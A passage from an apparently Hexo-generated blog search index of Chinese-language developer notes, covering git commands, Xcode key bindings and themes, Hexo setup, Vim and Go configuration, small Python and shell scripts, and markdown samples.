grep \"fix\" | xargs git branch -d\n```\n\n### 2.3 git 分支操作\n\n查看分支：git branch\n\n创建分支：git branch <name>\n\n切换分支：git checkout <name>\n\n创建+切换分支：git checkout -b <name>\n\n合并某分支到当前分支：git merge <name>\n\n删除分支：git branch -d <name>\n\n\n\n# 3. git 回滚\n\n### 3.1 撤销文件\n\n+ git修改文件后, 还没有add, commit.  这时撤销文件修改, 即回到上一版本的内容\n\n```bash\ngit checkout -- file\n```\n\n命令中的--很重要，没有--，就变成了“创建一个新分支”的命令，我们在后面的分支管理中会再次遇到git checkout命令。\n\n+ git add 文件后撤销add操作\n\n```bash\ngit reset HEAD file\n```\n\n### 3.2 撤销\n\n+ git push 后撤销\n\n```\ngit revert <hash> \n```\n\n+ commit消息撤销\n\n```\ngit commit --amend -m '新的消息'\n```\n\n+ 回滚文件的改动(未有commit) \n\n```\ngit checkout -- <filename>\n```\n\n+ 回滚版本\n\n```\ngit reset --hard <hash>  (--hard强制内容回归,如果修改内容保留不加此选项)\n```\n\n+ 停止追踪一个文件\n\n你偶然把application.log加到代码库里了，现在每次你运行应用，Git都会报告在application.log里有未提交的修改。你把 *.log放到了.gitignore文件里，可文件还是在代码库里，你怎样才能让Git“撤销”对这个文件的追踪呢？\n\n```\ngit rm --cached application.log\n```\n\n\n\n### 3.3 git 回滚版本\n\n在Git中，用HEAD表示当前版本,上一个版本就是HEAD^,上上一个版本就是HEAD^^,当然往上100个版本写100个^比较容易数不过来，所以写成HEAD~100。\n\n1. 回滚到上一个版本\n\n```bash\ngit reset --hard HEAD^\n```\n\n2. 回滚到任意一个版本\n\n```bash\ngit reset --hard 版本号(通过git log查看)\n```\n\n3. 如果git回滚到历史版本后, git log只能看历史版本再以前的版本号, 不到未来的版本号怎么办?\n\n>git 提供了一个命令git reflog用来记录你的每一次命令\n\n\n\n### 3.4 git回滚文件\n\n+ 查看文件的修改记录\n\n```bash\ngit log config.h\n```\n\n+ 查看文件版本的差别\n\n```bash\ngit diff a3551 fd681 config.h\n```\n\n+  回退到指定的版本\n\n```bash\ngit reset fd681 config.h\n```\n\n+  提交到本地参考\n\n```bash\ngit commit -m \"revert old file because commmit have a bug\"   \n```\n\n+ 更新到工作目录\n\n```bash\ngit checkout config.h   \n```\n\n+ 提交到远程仓库\n\n```bash\ngit push origin master  \n```\n\n\n\n### 3.5 解决冲突\n\n1. 建议手动解决冲突\n\n2. 命令行可以使用别人或自己的版本\n\n```bash\ngit checkout --theirs/--ours  file\n```\n\n\n\n# 4. git 配置\n\n### 4.1 git的配置\n\n1. 安装git\n2. 安装完成后，需要设置自己的用户名和email，在命令行输入：\n\n```bash\ngit config --global user.name \"levon\"\ngit config --global user.email \"levonfly@gmail.com\"\n```\n\n\n\n### 4.2 git和目录绑定\n\n1. 在一个目录里可以通过git init命令把这个目录变成Git可以管理的仓库,然后通过以下命令绑定提交的地址\n\n```bash\ngit remote add origin https://github.com/unix2dos/unix2dos.github.io\n```\n\n2. git clone 地址 就会创建目录和地址绑定\n\n\n\n### 4.3 github fork后更新源仓库的代码\n\n```bash\ngit remote add upstream https://github.com/golang/go\ngit remote -v\ngit fetch upstream\ngit merge upstream/master\n```\n\n\n\n### 4.4 git 增加 远程仓库 orgin(名字不一样)\n\n```\ngit remote add github git@github.com:unix2dos/dht.git\ngit push github master\n```\n\n\n\n### 4.5 git全局配置\n\n+ 中文不再显示8进制  git status显示中文\n\n```bash\ngit config --global core.quotepath false\n```\n\n+ 设置代理, 因为国内一些原因下载的很慢\n\n```bash\ngit config --global http.proxy 'localhost:8123'\ngit config --global --unset http.proxy\n```\n\n+ git区分文件大小写\n\ngit默认不区分文件大小写,导致文件名改了以后git状态没有改变,需要设置一下\n\n```\ngit config core.ignorecase false\n```\n\n### 4.6 git lg 完美显示\n\n```\ngit config --global alias.lg \"log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit\"\n```\n\n\n\n","tags":["git"],"categories":["git"]},{"title":"xcode自定义Eclipse中常用的快捷键","url":"%2Fp%2F30321ed4.html","content":"\n\n\n首先找到Xcode中的自带的配置文件\n\n```\n/Applications/Xcode.app/Contents/Frameworks/IDEKit.framework/Versions/A/Resources/IDETextKeyBindingSet.plist\n```\n这个文件里配置了一些可以设置快捷键的操作, 使用常用的编辑器打开它（需要root权限）。\n\n```\n\t<key>GDI Commands</key>\n\t<dict>\n\t\t<key>GDI Duplicate Current Line</key>\n\t\t<string>selectLine:, copy:, moveToEndOfLine:, insertNewline:, paste:, deleteBackward:</string>\n\t\t<key>GDI Delete Current Line</key>\n\t\t<string>deleteToBeginningOfLine:, moveToEndOfLine:, deleteToBeginningOfLine:, deleteBackward:, moveDown:, moveToBeginningOfLine:</string>\n\t\t<key>GDI Move Current Line Up</key>\n\t\t<string>selectLine:, cut:, moveUp:, moveToBeginningOfLine:, insertNewLine:, paste:, moveBackward:</string>\n\t\t<key>GDI Move Current Line Down</key>\n\t\t<string>selectLine:, cut:, moveDown:, moveToBeginningOfLine:, insertNewLine:, paste:, moveBackward:</string>\n\t\t<key>GDI Insert Line Above</key>\n\t\t<string>moveUp:, moveToEndOfLine:, insertNewline:</string>\n\t\t<key>GDI Insert Line Below</key>\n\t\t<string>moveToEndOfLine:, insertNewline:</string>\n\t</dict>\n```\n<!-- more -->\n把这段配置放到上面提到的IDETextKeyBindingSet.plist里，放在文件的最后的这两行之前：\n</dict>\n</plist>\n\n重启Xcode，在Xcode菜单中，打开Preferences，选中Key Binding，在右上方搜索GDI, 会出现类似下图的显示，如果没有的话，请检查上面的每步操作。\n\n","tags":["xcode"],"categories":["xcode"]},{"title":"xcode主题","url":"%2Fp%2Fb884c3b7.html","content":"\n\n\n### Xcode 主题\n\n```\nhttps://github.com/tursunovic/xcode-themes\n```\n\n### elfDark\n\n```\nhttps://code.google.com/archive/p/elf-ios-resource/downloads\n\ncd /Users/liuwei/Library/Developer/Xcode/UserData/FontAndColorThemes 放进去\n```\n\n\n<!-- more -->\n\n### cat ElfDark.xccolortheme\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>DVTConsoleDebuggerInputTextColor</key>\n\t<string>1 0.986905 0.947622 1</string>\n\t<key>DVTConsoleDebuggerInputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleDebuggerOutputTextColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTConsoleDebuggerOutputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleDebuggerPromptTextColor</key>\n\t<string>1 0.036325 0.0717013 1</string>\n\t<key>DVTConsoleDebuggerPromptTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleExectuableInputTextColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTConsoleExectuableInputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleExectuableOutputTextColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTConsoleExectuableOutputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleTextBackgroundColor</key>\n\t<string>0.109 0.109 0.109 1</string>\n\t<key>DVTConsoleTextInsertionPointColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTConsoleTextSelectionColor</key>\n\t<string>0.416 0.869 1 1</string>\n\t<key>DVTDebuggerInstructionPointerColor</key>\n\t<string>0.705792 0.8 0.544 1</string>\n\t<key>DVTMarkupTextBackgroundColor</key>\n\t<string>0.145 0.145 0.145 1</string>\n\t<key>DVTMarkupTextBorderColor</key>\n\t<string>0.2134 0.2134 0.2134 1</string>\n\t<key>DVTMarkupTextCodeFont</key>\n\t<string>SFMono-Regular - 13.0</string>\n\t<key>DVTMarkupTextEmphasisColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextEmphasisFont</key>\n\t<string>.AppleSystemUIFontItalic - 13.0</string>\n\t<key>DVTMarkupTextInlineCodeColor</key>\n\t<string>1 1 1 0.7</string>\n\t<key>DVTMarkupTextLinkColor</key>\n\t<string>0.192442 0.469436 0.928 1</string>\n\t<key>DVTMarkupTextLinkFont</key>\n\t<string>.AppleSystemUIFont - 13.0</string>\n\t<key>DVTMarkupTextNormalColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextNormalFont</key>\n\t<string>.AppleSystemUIFont - 13.0</string>\n\t<key>DVTMarkupTextOtherHeadingColor</key>\n\t<string>1 1 1 0.5</string>\n\t<key>DVTMarkupTextOtherHeadingFont</key>\n\t<string>.AppleSystemUIFont - 18.2</string>\n\t<key>DVTMarkupTextPrimaryHeadingColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextPrimaryHeadingFont</key>\n\t<string>.AppleSystemUIFont - 31.2</string>\n\t<key>DVTMarkupTextSecondaryHeadingColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextSecondaryHeadingFont</key>\n\t<string>.AppleSystemUIFont - 23.4</string>\n\t<key>DVTMarkupTextStrongColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextStrongFont</key>\n\t<string>.AppleSystemUIFontBold - 13.0</string>\n\t<key>DVTSourceTextBackground</key>\n\t<string>0.0706522 0.0706522 0.0706522 1</string>\n\t<key>DVTSourceTextBlockDimBackgroundColor</key>\n\t<string>0.109 0.109 0.109 1</string>\n\t<key>DVTSourceTextCurrentLineHighlightColor</key>\n\t<string>0.0609167 0.0946952 0.138587 1</string>\n\t<key>DVTSourceTextInsertionPointColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTSourceTextInvisiblesColor</key>\n\t<string>0.137973 0.380435 0.195417 1</string>\n\t<key>DVTSourceTextSelectionColor</key>\n\t<string>0.0317101 0.166824 0.342391 1</string>\n\t<key>DVTSourceTextSyntaxColors</key>\n\t<dict>\n\t\t<key>xcode.syntax.attribute</key>\n\t\t<string>1 0.904 0.984 1</string>\n\t\t<key>xcode.syntax.character</key>\n\t\t<string>0.921429 0.70068 0.169311 1</string>\n\t\t<key>xcode.syntax.comment</key>\n\t\t<string>0 0.502 0 1</string>\n\t\t<key>xcode.syntax.comment.doc</key>\n\t\t<string>0 0.502 0 1</string>\n\t\t<key>xcode.syntax.comment.doc.keyword</key>\n\t\t<string>0 0.502 0 1</string>\n\t\t<key>xcode.syntax.identifier.class</key>\n\t\t<string>0.355 0.922 0.986 1</string>\n\t\t<key>xcode.syntax.identifier.class.system</key>\n\t\t<string>0.229 0.721 0.887 1</string>\n\t\t<key>xcode.syntax.identifier.constant</key>\n\t\t<string>0.228 0.718 0.882 1</string>\n\t\t<key>xcode.syntax.identifier.constant.system</key>\n\t\t<string>0.228 0.718 0.882 1</string>\n\t\t<key>xcode.syntax.identifier.function</key>\n\t\t<string>0.248 0.78 0.959 1</string>\n\t\t<key>xcode.syntax.identifier.function.system</key>\n\t\t<string>0.227 0.714 0.878 1</string>\n\t\t<key>xcode.syntax.identifier.macro</key>\n\t\t<string>0.218579 0.6826 0.839759 1</string>\n\t\t<key>xcode.syntax.identifier.macro.system</key>\n\t\t<string>0.467 0.881 1 1</string>\n\t\t<key>xcode.syntax.identifier.type</key>\n\t\t<string>0.229 0.721 0.887 1</string>\n\t\t<key>xcode.syntax.identifier.type.system</key>\n\t\t<string>0.222 0.699 0.86 1</string>\n\t\t<key>xcode.syntax.identifier.variable</key>\n\t\t<string>0.23 0.725 0.891 1</string>\n\t\t<key>xcode.syntax.identifier.variable.system</key>\n\t\t<string>0.225 0.707 0.869 1</string>\n\t\t<key>xcode.syntax.keyword</key>\n\t\t<string>1 0.11 0.157 1</string>\n\t\t<key>xcode.syntax.number</key>\n\t\t<string>0.341 0.923 0.326 1</string>\n\t\t<key>xcode.syntax.plain</key>\n\t\t<string>1 1 1 1</string>\n\t\t<key>xcode.syntax.preprocessor</key>\n\t\t<string>0.18956 0.673603 0.983696 1</string>\n\t\t<key>xcode.syntax.string</key>\n\t\t<string>1 0.761311 0.178664 1</string>\n\t\t<key>xcode.syntax.url</key>\n\t\t<string>0.192442 0.469436 0.928 1</string>\n\t</dict>\n\t<key>DVTSourceTextSyntaxFonts</key>\n\t<dict>\n\t\t<key>xcode.syntax.attribute</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.character</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.comment</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.comment.doc</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.comment.doc.keyword</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.class</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.class.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.constant</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.constant.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.function</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.function.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.macro</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.macro.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.type</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.type.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.variable</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.variable.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.keyword</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.number</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.plain</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.preprocessor</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.string</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.url</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t</dict>\n</dict>\n</plist>\n```","tags":["xcode"],"categories":["xcode"]},{"title":"hexo搭建博客","url":"%2Fp%2Fb37651.html","content":"\n# 1. 安装hexo\n\n```bash\napt install npm\nnpm install -g hexo-cli\nmkdir hexo\nhexo init hexo\ncd hexo\n```\n\n<!-- more -->\n\n# 2. hexo配置\n\n+ 因为主站有个配置, 主题也有个配置, 建议两个配置合并一起, 需要Hexo版本在 3 以上\n\n+ 在站点的 `source/_data` 目录下新建 `next.yml` 文件（`_data`目录可能需要新建）迁移站点配置文件和主题配置文件中的配置到 `next.yml` 中(包含了`_config.yml`和`theme.yml`)\n  \n\t```\n\thexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n\t```\n\t\n+ 不渲染 README\n\n  将skip_render参数的值设置上。skip_render: README.md\n  使用hexo d 命令就不会在渲染 README.md 这个文件了。\n\n\n\n# 3. 绑定域名\n\n+ 为自己的 github 生成一个公钥私钥对\n\n+ 建立带用户名的仓库 unix2dos.github.io\n\n- CNAME 放到 source 文件夹, 里面写上 www.liuvv.com\n- 向你的 DNS 配置中添加 3 条记录\n\n```\n@          A             192.30.252.153\n@          A             192.30.252.154\nwww      CNAME           unix2dos.github.io.\n```\n\n\n\n# 4. hexo插件\n\n```shell\nnpm install hexo --save\nnpm install hexo-deployer-git --save\n\nnpm ls --depth 0  //查看丢失的包\nnpm install hexo-generator-archive --save //逐一安装缺失的包\n\n\n### hexo-next 主题\n\n# 第一台电脑\ncd themes\ngit submodule add https://github.com/unix2dos/hexo-theme-next next\ncd next\n\n# 第二台电脑\ngit submodule update --init\ncd themes/next\n\n# 分享按钮\ngit clone https://github.com/theme-next/theme-next-needmoreshare2 source/lib/needsharebutton  \n\n# 丝带\ngit clone https://github.com/theme-next/theme-next-canvas-ribbon source/lib/canvas-ribbon\n\n# 蜘蛛网\ngit clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest\n\n# 三种特效\ngit clone https://github.com/theme-next/theme-next-three source/lib/three \n\n# 特殊汉字\ngit clone https://github.com/theme-next/theme-next-han source/lib/Han\n\n# 快速点击\ngit clone https://github.com/theme-next/theme-next-fastclick source/lib/fastclick\n\n# 懒加载\ngit clone https://github.com/theme-next/theme-next-jquery-lazyload source/lib/jquery_lazyload\n\n# 顶部的进度\ngit clone https://github.com/theme-next/theme-next-pace source/lib/pace \n\n# 图片展示\ngit clone https://github.com/theme-next/theme-next-fancybox3 source/lib/fancybox \n\n# 文字显示加空格\ngit clone https://github.com/theme-next/theme-next-pangu.git source/lib/pangu\n\n# 读取进度\ngit clone https://github.com/theme-next/theme-next-reading-progress source/lib/reading_progress \n\n\n### hexo-next 插件\n\n1. npm install hexo-symbols-count-time --save   # 统计字数\n\nsymbols_count_time:\n  symbols: true\n  time: true\n  total_symbols: true\n  total_time: true\n  separated_meta: true\n  item_text_post: true\n  item_text_total: false\n  awl: 4\n  wpm: 275\n\n\n2. npm install hexo-abbrlink --save # 链接持久\n\npermalink: post/:abbrlink.html\nabbrlink:\n  alg: crc16 #support crc16(default) and crc32\n  rep: hex    #support dec(default) and hex\n  \n  \n3. npm install hexo-auto-category --save #自动分类\n\nauto_category:\n enable: true\n depth:\n \n \n4. npm install hexo-generator-searchdb --save # 本地搜索\n\nsearch:\n  path: search.json\n  field: post\n  format: html\n  limit: 10000\n  content: true\n  \n#然后打开本地local_search\nlocal_search:\n\tenable: true\n  \n\n5. npm install hexo-asset-image --save\npost_asset_folder: true\n```\n\n\n\n### 4.1 置顶\n\nhttps://github.com/netcan/hexo-generator-index-pin-top\n\n\n\n# 5. 问题解决方案\n\n### 5.1 生成空白页\n\n+ 生成页面如果空白的话, 换个主题再重新生成一次\n+ 更新下主题仓库\n\n### 5.2  WARN No layout\n\n看看主题里面究竟有没有东西,文件夹名字和主题是否对应\n\n### 5.3 使用链接持久后图片无法显示\n\n+ https://github.com/rozbo/hexo-abbrlink/issues/19\n\n```javascript\n# vi node_modules/hexo-asset-image/index.js     #24行\n\n// var endPos = link.length-1; // 换成下面的这句话\nvar endPos = link.length-5; //因为我的permalink: p/:abbrlink.html,  这里要改成-5\n\n\n// 正则也要替换\n/*\n/http[s]*.*|\\/\\/.*/.test(src)  \n/^(((http|https|ftp|rtsp|mms)+:\\/{2})|\\/).+/.test(src)\n*/\n```\n\n### 5.4 证书更新\n\n1. coding\n\n+ 暂停dns解析github \n+ coding申请证书\n+ 再打开解析github\n\n2. github\n\n### 5.5 主题更新\n\n+ fork 到自己github, 用新的分支, 修改了一些language\n+ 定期同步最新的仓库主题\n\n### 5.6 备案\n\n+ ICP备案\n\n  云服务器进行 ICP 备案\n\n+ 公安备案\n\n  http://www.beian.gov.cn/portal/index.do\n\n  \n\n# 6. 常用命令\n\n```html\nhexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n\n---\ntitle: \"\"\ndate: 2018-05-19 17:54:46\ntags:\n- golang\n- linux\n---\n\n<!-- more -->\n\n\n![1](Kademlia_DHT_KRPC_BitTorrent协议/1.png)\n```\n\n","tags":["hexo"],"categories":["博客"]},{"title":"shell批量文件内容复制到一个文件内","url":"%2Fp%2F875a198.html","content":"\n> 公司需要把所有代码放到一个文件内,加上版权信息. 于是用shell简单的处理了下\n\n```shell\n#!/bin/sh\n\nNAME=\"a.txt\"\nif [ -f $NAME ]; then\n\t`rm $NAME`\nfi\n\nDIR=\"\"\nFILE=\"\"\nfor file in `ls -R`\ndo\n\tif [ -f $file ]; then\n\t\tif [ $file = \"a.sh\" ];then\n\t\t\tcontinue\t\n\t\tfi\n#\t\techo \"===================== $file begin =====================\" >> $NAME\n#\t\t`cat $file >> $NAME`\n#\t\techo \"===================== $file end =====================\" >> $NAME\n\t\techo $file\t\t\n\telse \n\t\tif  [ ${file:0:1} = \".\" ];then\n\t\t\tDIR=${file/://}\n\t\telse  \n\t\t\tif [ \"$DIR\" != \"\" ] && [ ${DIR:0:6} = \"./base\" ];then\n\t\t\t\tcontinue #此处可以过滤不想要的文件夹\t\n\t\t\tfi\n\t\t\tFILE=$DIR$file\n\t\t\tif [ -f $FILE ]; then\n\t\t#\t\techo \"===================== $file begin =====================\" >> $NAME\n\t\t#\t\t`cat $FILE >> $NAME`\n\t\t#\t\techo \"===================== $file end =====================\" >> $NAME\n\t\t\t\techo $FILE\n\t\t\tfi\n\t\tfi\n\tfi\ndone\n```\n","tags":["shell"],"categories":["命令"]},{"title":"python使用正则后向引用替换字符串","url":"%2Fp%2F136fd428.html","content":">工作需要把 `Mud makes my mom mad.` 这句话带有m的加上颜色,或者把某些单词加上颜色\n>临时写了个脚本处理\n\n```python\nimport re\nimport sys\n\n\n# replace letter\n#find = \"m\"\n#str = \"Mud makes my mom mad.\"\n\n#replace key words\n#find = \"Mud|makes|mad\"\n#str  = \"Mud makes my mom mad.\"\n\n# how to use\n# python b.py \"m\"\t\"Mud makes my mom mad.\" \n# python b.py \"mud|mess|mop|make|the|help\"\t\"Mud makes my mom mad.\"\n\n\nfind  = sys.argv[1] \nstr   = sys.argv[2] \n\n\nresult = re.sub(r'('+find+')', r'<color:#ff0000>\\1</color>', str, 0, re.IGNORECASE)\nprint result\n\n```\n","tags":["python"],"categories":["python"]},{"title":"mac系统vim升级流程","url":"%2Fp%2F4ea69092.html","content":"\n#### 执行命令安装vim 注意要加上`--with-override-system-vi`\n```bash\nbrew install vim --with-override-system-vi\n```\n\n\n#### 安装过程中如果出现 ruby.h找不到\n\n执行下面的命令\n\n```bash\ncd /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.11.sdk/System/Library/Frameworks/Ruby.framework/Versions/2.0/usr/include/ruby-2.0.0/ruby\n```\n\n```bash\nsudo ln -s ../universal-darwin15/ruby/config.h ./config.h\n```\n注意不要复制上面的, 对应自己的sdk版本,ruby版本,darwin版本\n\n\n<!-- more -->\n#### 给自己的vim做个别名, 注意自己vim的版本路径\n\n```bash\nalias vim=\"/usr/local/Cellar/vim/7.4.2152/bin/vim\"\n```\n\n\n\n#### 升级vim后如果主题不显示\n把自己主题文件放到这个 `/usr/local/Cellar/vim/7.4.2152/bin/vim`里\n\n\n#### 让git也适应最新的vim\n\n```bash\ngit config --global core.editor /usr/local/Cellar/vim/7.4.2152/bin/vim\n```\n\n\n--------\n\n## 另外一种方案, 安装macvim\n\nInstall the latest version of MacVim. Yes, MacVim. And yes, the latest.\n\nIf you don't use the MacVim GUI, it is recommended to use the Vim binary that is inside the MacVim.app package (MacVim.app/Contents/MacOS/Vim). To ensure it works correctly copy the mvim script from the MacVim download to your local binary folder (for example /usr/local/bin/mvim) and then symlink it:\n\n\n\n```\nalias vim=\"/Applications/MacVim.app/Contents/MacOS/Vim\"\ngit config --global core.editor /Applications/MacVim.app/Contents/MacOS/Vim\n```\n\nIt requires Vim 7.3.885 or later with Lua support (\"+lua\").\n```\nbrew install macvim --with-lua\n```\n","tags":["vim"],"categories":["软件"]},{"title":"golang配置vim","url":"%2Fp%2F3feff448.html","content":"### 配置文件和快速设置\n- [.vimrc][1]\n- [.zhsrc][2]\n[1]: https://github.com/unix2dos/go-tutorial/blob/master/.vimrc\n[2]: https://github.com/unix2dos/go-tutorial/blob/master/.zshrc\n\n1. PlugClean\n2. PlugInstall\n3. 去到YCM里执行\n```\n./install.py --clang-completer --gocode-completer\n```\n\n\n### 安装插件管理器\n```bash\ncurl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n```\n\n### 安装插件\n```bash\ncall plug#begin()\nPlug 'fatih/vim-go' \"go\nPlug 'tomasr/molokai' \"主题\nPlug 'SirVer/ultisnips' \"tab补全\nPlug 'ctrlpvim/ctrlp.vim' \"快速查文件\nPlug 'Shougo/neocomplete.vim' \"实时提示\nPlug 'majutsushi/tagbar' \"tagbar\nPlug 'scrooloose/nerdtree' \"导航\nPlug 'vim-airline/vim-airline' \"下面\ncall plug#end()\n```\n<!-- more -->\n\n###  安装go tools需要的东西﻿\n直接使用`:GoInstallBinaries`安装\n如果网络不行(你懂的), 把代理把包都下载下来\n\n```bash\ngit clone https://go.googlesource.com/tools  \n```\n\n\n### goTags需要安装ctags\n\n```bash\nbrew install ctags\n```\n﻿\n\n### 代码实时提示neocomplete, 需要vim支持lua\n```bash\nbrew uninstall vim\nbrew install luajit\nbrew install vim --with-luajit\n```\n\n\n### Gocode autocomplete non imported packages\n```\ngocode set unimported-packages true\n```","tags":["golang"],"categories":["3_golang杂项"]},{"title":"python读取文件去除html_xml标签","url":"%2Fp%2Ff3ea3847.html","content":"\n> 自己写的一个简单去除html标签(xml)的脚本\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<text font=\"Palatino Linotype\">\n<p>\n<s end_audio=\"262\" start_audio=\"13\">\n<w end_audio=\"94\" id=\"0\" start_audio=\"13\" variants=\"mud\">Mud</w>\n<w end_audio=\"122\" id=\"1\" start_audio=\"95\">makes</w>\n<w end_audio=\"140\" id=\"2\" start_audio=\"123\">my</w>\n<w end_audio=\"215\" id=\"3\" start_audio=\"141\">mom</w>\n<w end_audio=\"262\" id=\"4\" start_audio=\"216\" variants=\"mad\">mad.</w>\n</s>\n</p>\n</text>\n```\n\n```python\nimport re\nimport sys\n\n# how to use\n# pythone a.py C6M01B1-001.xml\n\nfile = sys.argv[1]\nf = open(file, 'r')\n\nres = \"\"\nfor line in f.readlines():\n\t#str = re.sub(r'</?\\w+[^>]*>','',line)\n\tstr = re.sub(r'<(/|\\?)?\\w+[^>]*>','',line)\n\tif str != '\\r\\n':\n\tres = res + str\n\tres = re.sub('\\r\\n',' ',res)\n\tprint res\n#print \"len =\",len(res)\n```\n","tags":["python"],"categories":["python"]},{"title":"markdown语法集合","url":"%2Fp%2F1ef7af3b.html","content":"\n\n> This is a blockquote.\n> \n> This is the second paragraph in the blockquote.\n>\n> ## This is an H2 in a blockquote\n\n\n\nSome of these words *are emphasized*.\n\nUse two asterisks for **strong emphasis**.\t\n\n<!-- more -->\n\t\t\n\t\t\t\t\t\n- Candy.\n- Gum.\n- Booze.\n\n\t​\t\n1. Red\n2. Green\n3. Blue\n\n\nThis is an [example link](http://example.com/)\n\nI get 10 times more traffic from [Google][1] than from\n[Yahoo][2] or [MSN][a].\n\n[1]: http://google.com/ \"Google\"\n[2]: http://search.yahoo.com/ \"Yahoo Search\"\n[a]: http://search.msn.com/ \"MSN Search\"\n\n\n\n\n![alt text](/images/a.jpg \"Title\")\n\n![alt text][id]\n\n[id]: /images/a.jpg \"Title\"\n\n\nI strongly recommend against using any `<blink>` tags.\n\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86   \n    src=\"http://music.163.com/outchain/player?type=2&id=25706282&auto=0&height=66\">  \n</iframe> \n\n<iframe   \n    height=498 width=510   \n    src=\"http://www.iqiyi.com/v_19rr9nypk0.html\"\n    frameborder=0 allowfullscreen>  \n</iframe>  \n\n\n| Tables        | Are           | Cool  |\n| ------------- |:-------------:| -----:|\n| col 3 is      | right-aligned | $1600 |\n| col 2 is      | centered      |   $12 |\n| zebra stripes | are neat      |    $1 |\n\n","tags":["markdown"],"categories":["计算机基础"]},{"title":"android自动添加文件到android-mk","url":"%2Fp%2F99b8fe68.html","content":"\n将\n```bash\nLOCAL_SRC_FILES := hellocpp/main.cpp \\  \n                   ../../Classes/AppDelegate.cpp \\  \n                   ../../Classes/HelloWorldScene.cpp \n```\n换成\n\n```bash\nFILE_LIST := hellocpp/main.cpp    \nFILE_LIST += $(wildcard $(LOCAL_PATH)/../../Classes/*.cpp)    \nLOCAL_SRC_FILES := $(FILE_LIST:$(LOCAL_PATH)/%=%)   \n```\n\n----\n\n<!-- more -->\n**另外一种方法:**\n\n```bash\n#遍历目录及子目录的函数  \ndefine walk  \n    $(wildcard $(1)) $(foreach e, $(wildcard $(1)/*), $(call walk, $(e)))  \nendef  \n  \n#遍历Classes目录  \nALLFILES = $(call walk, $(LOCAL_PATH)/../../Classes)  \nFILE_LIST := hellocpp/main.cpp  \n#从所有文件中提取出所有.cpp文件  \nFILE_LIST += $(filter %.cpp, $(ALLFILES))  \nLOCAL_SRC_FILES := $(FILE_LIST:$(LOCAL_PATH)/%=%)\n```\n","tags":["android"],"categories":["android"]},{"title":"gitbook--制作pdf","url":"%2Fp%2F1f9c8aa6.html","content":"\n## 命令行:\ngitbook pdf Effective-Modern-Cpp-Zh  myname.pdf\n\n\n\n### 如果无法生成 需要安装 calibre  \n\n安装后还要执行命令\nln -s /Applications/calibre.app/Contents/MacOS/ebook-convert /usr/local/bin\n\n","tags":["others"],"categories":["git"]},{"title":"我的第一篇博客","url":"%2Fp%2Fd95d7e09.html","content":"\n我的第一篇博客,写点什么好呢? \n希望以后能坚持写下去把.\n","tags":["others"],"categories":["博客"]}]